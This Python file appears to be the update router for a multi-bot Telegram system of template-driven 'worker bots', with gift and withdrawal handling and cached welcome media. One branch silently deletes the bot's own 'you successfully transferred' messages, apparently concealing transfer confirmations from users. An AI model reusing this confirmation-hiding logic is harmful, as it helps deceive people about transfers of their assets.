from aiogram import Bot
from aiogram.types import Update, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.exceptions import TelegramBadRequest
from sqlalchemy import select
from sqlalchemy.orm import selectinload
from db import Session
from models import WorkerBot
from worker_bot_logic import handle_worker_start, make_reply_markup 
from als_text import get_als_text, get_pyid_text
from admin_gift_fsm import handle_gift_fsm, user_fsm_states, user_fsm_data
from base_templates.registry import BASE_TEMPLATES_MAP
from cache import get_template_cached

from cache import (
    get_cached_video_fileid,
    set_cached_video_fileid,
    invalidate_video_fileid,
)

async def process_custom_template_callback(callback, bot, chat_id, template):
    text = template.get("second_button_reply") if isinstance(template, dict) else getattr(template, "second_button_reply", None)
    if callback.data == "second_button_reply":
        await bot.send_message(
            chat_id=chat_id,
            text=text or "Текст не задан.",
            parse_mode="HTML"
        )

async def handle_update(update: dict, bot: Bot, bots: dict):
    upd = Update.model_validate(update)
    token = next((t for t, b in bots.items() if b == bot), None)
    if not token:
        return

    async with Session() as session:
        worker_bot = await session.scalar(
            select(WorkerBot)
            .where(WorkerBot.token == token)
            .options(selectinload(WorkerBot.template))
        )
        if not worker_bot:
            return

        template = None

        if getattr(worker_bot, "base_template_id", None):
            template = BASE_TEMPLATES_MAP.get(worker_bot.base_template_id)
        elif worker_bot.template:
            template = await get_template_cached(session, worker_bot.template.id, worker_bot.owner_id)

        if not template:
            chat_id = None
            if upd.message:
                chat_id = upd.message.chat.id
            elif upd.callback_query and upd.callback_query.message:
                chat_id = upd.callback_query.message.chat.id
            if chat_id:
                await bot.send_message(chat_id, "❌ Шаблон не установлен")
            return

        bot_username = worker_bot.username or "бот"

        if upd.message:
            await process_message(upd.message, bot, token, bot_username, template)
        elif upd.callback_query:
            await process_callback(upd.callback_query, bot, template, bot_username)

async def handle_update_with_cache(update: dict, bot: Bot, bots: dict, worker_bot_data: dict):
    upd = Update.model_validate(update)
    token = next((t for t, b in bots.items() if b == bot), None)
    if not token:
        return

    template = None
    
    if worker_bot_data.get("base_template_id"):
        template = BASE_TEMPLATES_MAP.get(worker_bot_data["base_template_id"])
    elif worker_bot_data.get("template"):
        async with Session() as session:
            template = await get_template_cached(session, worker_bot_data["template_id"], worker_bot_data["owner_id"])

    if not template:
        chat_id = None
        if upd.message:
            chat_id = upd.message.chat.id
        elif upd.callback_query and upd.callback_query.message:
            chat_id = upd.callback_query.message.chat.id
        if chat_id:
            await bot.send_message(chat_id, "❌ Шаблон не установлен")
        return

    bot_username = worker_bot_data.get("username") or "бот"

    if upd.message:
        await process_message(upd.message, bot, token, bot_username, template)
    elif upd.callback_query:
        await process_callback(upd.callback_query, bot, template, bot_username)

async def process_message(msg, bot, token, bot_username, template):
    chat_id = msg.chat.id
    user_id = msg.from_user.id
    text = getattr(msg, "text", None)

    if (
        msg.from_user.id == (await bot.me()).id and
        text and
        text.startswith("Вы успешно перевели ")
    ):
        try:
            await bot.delete_message(chat_id=chat_id, message_id=msg.message_id)
        except Exception as e:
            print(f"[WARN] Не удалось удалить сообщение: {e}")
        return

    if not text:
        return

    if text.startswith("/als"):
        als_text = get_als_text(msg, bot_username)
        await bot.send_message(chat_id, als_text, parse_mode="HTML")
        return

    if text.startswith("/pyid"):
        pyid_text = get_pyid_text(msg, bot_username)
        await bot.send_message(chat_id, pyid_text, parse_mode="HTML")
        return

    if text.startswith("/start"):
        user_fsm_states.pop(user_id, None)
        user_fsm_data.pop(user_id, None)
        await handle_worker_start(bot, msg, token, template)
        return

    from base_templates.base6 import BaseTemplate6, pending_withdraw
    if getattr(template, "id", None) == "base_6":
        if hasattr(template, "handle_text_input") and callable(template.handle_text_input):
            await template.handle_text_input(msg, bot)
            if user_id not in pending_withdraw:
                return

    if hasattr(template, "handle_base3_message") and callable(template.handle_base3_message):
        await template.handle_base3_message(msg, bot)
        return

    await handle_gift_fsm(msg, bot, token)

async def process_callback(callback, bot, template, worker_bot_id):
    user_id = callback.from_user.id
    chat_id = callback.message.chat.id if callback.message else user_id
    data = callback.data

    if template:
        if data == "second_button_reply":
            await handle_second_button_reply(callback, bot, chat_id, template)
            return
        if data == "custom_back":
            await handle_custom_back(callback, bot, chat_id, template, worker_bot_id)
            return

        if hasattr(template, "process_callback") and callable(template.process_callback):
            await template.process_callback(callback, bot, chat_id)
            return

    await bot.answer_callback_query(callback.id, text="Обработано")

async def handle_second_button_reply(callback, bot, chat_id, template):
    try:
        await bot.delete_message(chat_id, callback.message.message_id)
    except TelegramBadRequest:
        pass
    text = template.get("second_button_reply") if isinstance(template, dict) else getattr(template, "second_button_reply", None)
    await bot.send_message(
        chat_id,
        text or "Текст не задан.",
        parse_mode="HTML"
    )

async def handle_custom_back(callback, bot, chat_id, template, worker_bot_id):
    try:
        await bot.delete_message(chat_id, callback.message.message_id)
    except TelegramBadRequest:
        pass
    
    after_start = template.get("after_start") if isinstance(template, dict) else getattr(template, "after_start", None)
    video_path = template.get("video_path") if isinstance(template, dict) else getattr(template, "video_path", None)
    photo_url = template.get("photo_url") if isinstance(template, dict) else getattr(template, "photo_url", None)
    reply_markup = await make_reply_markup(template)

    if video_path:
        file_id = await get_cached_video_fileid(worker_bot_id)
        if file_id:
            try:
                await bot.send_video(
                    chat_id=chat_id,
                    video=file_id,
                    caption=after_start or "Добро пожаловать!",
                    reply_markup=reply_markup,
                    parse_mode="HTML"
                )
                return
            except Exception:
                await invalidate_video_fileid(worker_bot_id)

        sent_message = await bot.send_video(
            chat_id=chat_id,
            video=FSInputFile(video_path),
            caption=after_start or "Добро пожаловать!",
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
        if sent_message.video:
            await set_cached_video_fileid(worker_bot_id, sent_message.video.file_id)

    elif photo_url:
        await bot.send_photo(
            chat_id=chat_id,
            photo=photo_url,
            caption=after_start or "Добро пожаловать!",
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    else:
        await bot.send_message(
            chat_id=chat_id,
            text=after_start or "Добро пожаловать!",
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
